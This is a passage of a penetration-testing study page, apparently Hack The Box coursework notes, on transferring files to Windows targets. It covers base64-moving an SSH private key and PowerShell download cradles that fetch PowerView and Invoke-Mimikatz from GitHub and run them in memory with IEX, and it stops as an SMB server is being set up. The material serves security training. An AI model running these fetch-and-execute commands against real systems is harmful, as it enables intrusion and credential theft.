<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="File Transfers PowerShell Base64 Encode and Decode We can encode a file to a base64 string, copy contents from the terminal and then perform the reverse operation, meaning decoding the file in the original content."><title>Files Transfer - HTB Writeup</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=ico href=https://pietraferreira.github.io/quartz//favicon.ico><link href=https://pietraferreira.github.io/quartz/styles.5c5e8e492b01ec554ac9a86fe1e7f16f.min.css rel=stylesheet><link href=https://pietraferreira.github.io/quartz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://pietraferreira.github.io/quartz/js/darkmode.a93be4d36d657139e957880e320dd457.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/util.fa8e74b4065b97e6980a72cc472e436f.min.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/copy-tex.min.js integrity=sha384-ww/583aHhxWkz5DEVn6OKtNiIaLi2iBRNZXfJRiY1Ai7tnJ9UXpEsyvOITVpTl4A crossorigin=anonymous></script>
<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
<script src=https://pietraferreira.github.io/quartz/js/popover.9b72b70bd35617d0635e9d15463662b2.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
<script>const SEARCH_ENABLED=!1,PRODUCTION=!0,BASE_URL="https://pietraferreira.github.io/quartz/",fetchData=Promise.all([fetch("https://pietraferreira.github.io/quartz/indices/linkIndex.41cc197e41e8df8dfa3334da5d04b912.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://pietraferreira.github.io/quartz/indices/contentIndex.93ab403a2838aa374d9a99e766045b91.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://pietraferreira.github.io/quartz",!0,!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://pietraferreira.github.io/quartz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],macros:{'â€™':"'"},throwOnError:!1})}</script><script type=module>
    import { attachSPARouting } from "https:\/\/pietraferreira.github.io\/quartz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
    attachSPARouting(init, render)
  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
<script defer src=https://pietraferreira.github.io/quartz/js/full-text-search.51f0b1753e9b30839d053f8a98cc20d1.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://pietraferreira.github.io/quartz/>ðŸª… Morioh</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>Files Transfer - HTB Writeup</h1><p class=meta>Last updated
May 11, 2023
<a href=https://github.com/jackyzha0/quartz/tree/hugo/content/notes/hacking/files-transfer-htb-writeup.md rel=noopener>Edit Source</a></p><ul class=tags><li><a href=https://pietraferreira.github.io/quartz/tags/hacking/>Hacking</a></li><li><a href=https://pietraferreira.github.io/quartz/tags/hacking/htb/>Hacking htb</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#powershell-base64-encode-and-decode>PowerShell Base64 Encode and Decode</a></li><li><a href=#downloading-files-using-powershell>Downloading Files using PowerShell</a></li><li><a href=#setup-internet-explorer-error>Setup Internet Explorer Error</a></li><li><a href=#smb-downloads>SMB Downloads</a></li><li><a href=#ftp-downloads>FTP Downloads</a></li></ol><ol><li><a href=#powershell-base64-encode-and-decode-1>PowerShell Base64 Encode and Decode</a></li><li><a href=#powershell-web-uploads>PowerShell Web Uploads</a></li><li><a href=#powershell-base64-web-upload>PowerShell Base64 Web Upload</a></li><li><a href=#smb-uploads>SMB Uploads</a><ol><li><a href=#configuring-webdav-server>Configuring webdav server</a></li></ol></li><li><a href=#ftp-uploads>FTP Uploads</a></li></ol></nav></details></aside><a href=#file-transfers><h1 id=file-transfers><span class=hanchor arialabel=Anchor># </span>File Transfers</h1></a><a href=#powershell-base64-encode-and-decode><h2 id=powershell-base64-encode-and-decode><span class=hanchor arialabel=Anchor># </span>PowerShell Base64 Encode and Decode</h2></a><p>We can encode a file to a base64 string, copy contents from the terminal and then perform the reverse operation, meaning decoding the file in the original content.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ md5sum id_rsa
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>4e301756a07ded0a2dd6953abf015278  id_rsa
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ cat id_rsa <span class=p>|</span>base64 -w 0<span class=p>;</span><span class=nb>echo</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo</span><span class=o>=</span>
</span></span></code></pre></td></tr></table></div></div><p>Then we copy it and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=no>[IO.File]</span><span class=p>::</span><span class=n>WriteAllBytes</span><span class=p>(</span><span class=s2>&#34;C:\Users\Public\id_rsa&#34;</span><span class=p>,</span> <span class=no>[Convert]</span><span class=p>::</span><span class=n>FromBase64String</span><span class=p>(</span><span class=s2>&#34;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>Finally, we can confirm if the file was transferred successfully using the
<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2" rel=noopener>Get-FileHash</a> cmdlet, which does the same thing that <code>md5sum</code> does.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=nb>Get-FileHash</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Public</span><span class=p>\</span><span class=n>id_rsa</span> <span class=n>-Algorithm</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Algorithm</span>       <span class=n>Hash</span>                                                                   <span class=n>Path</span>
</span></span><span class=line><span class=cl><span class=p>---------</span>       <span class=p>----</span>                                                                   <span class=p>----</span>
</span></span><span class=line><span class=cl><span class=n>MD5</span>             <span class=n>4E301756A07DED0A2DD6953ABF015278</span>                                       <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Public</span><span class=p>\</span><span class=n>id_rsa</span>
</span></span></code></pre></td></tr></table></div></div><p>While this method is convenient, it&rsquo;s not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.</p><a href=#downloading-files-using-powershell><h2 id=downloading-files-using-powershell><span class=hanchor arialabel=Anchor># </span>Downloading Files using PowerShell</h2></a><ul><li>DownloadFile method: we can specify the class name <code>Net.WebClient</code> and the method <code>DownloadFile</code> with the parameters corresponding to the URL of the target file to download and the output file name.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=c># Example: (New-Object Net.WebClient).DownloadFile(&#39;&lt;Target File URL&gt;&#39;,&#39;&lt;Output File Name&gt;&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=p>(</span><span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=n>DownloadFile</span><span class=p>(</span><span class=s1>&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1&#39;</span><span class=p>,</span><span class=s1>&#39;C:\Users\Public\Downloads\PowerView.ps1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=c># Example: (New-Object Net.WebClient).DownloadFileAsync(&#39;&lt;Target File URL&gt;&#39;,&#39;&lt;Output File Name&gt;&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=p>(</span><span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=n>DownloadFileAsync</span><span class=p>(</span><span class=s1>&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&#39;</span><span class=p>,</span> <span class=s1>&#39;PowerViewAsync.ps1&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>Fileless Method: as we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the
<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2" rel=noopener>Invoke-Expression</a> cmdlet or the alias <code>IEX</code>.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=nb>IEX </span><span class=p>(</span><span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=n>DownloadString</span><span class=p>(</span><span class=s1>&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><code>IEX</code> also accepts pipeline input.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=p>(</span><span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=n>DownloadString</span><span class=p>(</span><span class=s1>&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#39;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>IEX
</span></span></span></code></pre></td></tr></table></div></div><ul><li>Invoke-WebRequest: from PowerShell 3.0 onwards, the
<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2" rel=noopener>Invoke-WebRequest</a> cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases <code>iwr</code>, <code>curl</code>, and <code>wget</code> instead of the <code>Invoke-WebRequest</code> full name.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=nb>Invoke-WebRequest</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>raw</span><span class=p>.</span><span class=n>githubusercontent</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>PowerShellMafia</span><span class=p>/</span><span class=n>PowerSploit</span><span class=p>/</span><span class=n>dev</span><span class=p>/</span><span class=n>Recon</span><span class=p>/</span><span class=n>PowerView</span><span class=p>.</span><span class=n>ps1</span> <span class=n>-OutFile</span> <span class=n>PowerView</span><span class=p>.</span><span class=n>ps1</span>
</span></span></code></pre></td></tr></table></div></div><p>Harmj0y has compiled an extensive list of PowerShell download cradles
<a href=https://gist.github.com/HarmJ0y/bb48307ffa663256e239 rel=noopener>here</a>.</p><a href=#setup-internet-explorer-error><h2 id=setup-internet-explorer-error><span class=hanchor arialabel=Anchor># </span>Setup Internet Explorer Error</h2></a><p><img src=https://academy.hackthebox.com/storage/modules/24/IE_settings.png width=auto alt=image></p><p>Can be bypassed using the parameter <code>-UseBasicParsing</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=nb>Invoke-WebRequest</span> <span class=n>https</span><span class=err>:</span><span class=p>//&lt;</span><span class=n>ip</span><span class=p>&gt;/</span><span class=n>PowerView</span><span class=p>.</span><span class=n>ps1</span> <span class=p>|</span> <span class=nb>IEX
</span></span></span><span class=line><span class=cl><span class=nb></span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WebRequest</span> <span class=err>:</span> <span class=n>The</span> <span class=n>response</span> <span class=n>content</span> <span class=n>cannot</span> <span class=n>be</span> <span class=n>parsed</span> <span class=n>because</span> <span class=n>the</span> <span class=n>Internet</span> <span class=n>Explorer</span> <span class=n>engine</span> <span class=n>is</span> <span class=n>not</span> <span class=n>available</span><span class=p>,</span> <span class=n>or</span> <span class=n>Internet</span> <span class=n>Explorer</span><span class=err>&#39;</span><span class=n>s</span> <span class=nb>first-launch</span> <span class=n>configuration</span> <span class=n>is</span> <span class=n>not</span> <span class=n>complete</span><span class=p>.</span> <span class=n>Specify</span> <span class=n>the</span> <span class=n>UseBasicParsing</span> <span class=k>parameter</span> <span class=n>and</span> <span class=k>try</span> <span class=n>again</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=n>At</span> <span class=n>line</span><span class=err>:</span><span class=n>1</span> <span class=n>char</span><span class=err>:</span><span class=n>1</span>
</span></span><span class=line><span class=cl><span class=p>+</span> <span class=nb>Invoke-WebRequest</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>raw</span><span class=p>.</span><span class=n>githubusercontent</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>PowerShellMafia</span><span class=p>/</span><span class=n>P</span> <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>+</span> <span class=p>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
</span></span><span class=line><span class=cl><span class=p>+</span> <span class=n>CategoryInfo</span> <span class=err>:</span> <span class=n>NotImplemented</span><span class=err>:</span> <span class=p>(</span><span class=err>:</span><span class=p>)</span> <span class=p>[</span><span class=nb>Invoke-WebRequest</span><span class=p>],</span> <span class=n>NotSupportedException</span>
</span></span><span class=line><span class=cl><span class=p>+</span> <span class=n>FullyQualifiedErrorId</span> <span class=err>:</span> <span class=n>WebCmdletIEDomNotSupportedException</span><span class=p>,</span><span class=n>Microsoft</span><span class=p>.</span><span class=n>PowerShell</span><span class=p>.</span><span class=n>Commands</span><span class=p>.</span><span class=n>InvokeWebRequestCommand</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>htb</span><span class=p>&gt;</span> <span class=nb>Invoke-WebRequest</span> <span class=n>https</span><span class=err>:</span><span class=p>//&lt;</span><span class=n>ip</span><span class=p>&gt;/</span><span class=n>PowerView</span><span class=p>.</span><span class=n>ps1</span> <span class=n>-UseBasicParsing</span> <span class=p>|</span> <span class=nb>IEX
</span></span></span></code></pre></td></tr></table></div></div><a href=#smb-downloads><h2 id=smb-downloads><span class=hanchor arialabel=Anchor># </span>SMB Downloads</h2></a><p>The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.</p><p>We can use SMB to download files easily. We need to create an SMB server with
<a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py rel=noopener>smbserver.py</a> from Impacket and then use <code>copy</code>, <code>move</code>, PowerShell <code>Copy-Item</code>, or any other tool that allows connection to SMB.</p><ul><li>Create the server:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Pietra@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo impacket-smbserver share -smb2support /tmp/smbshare
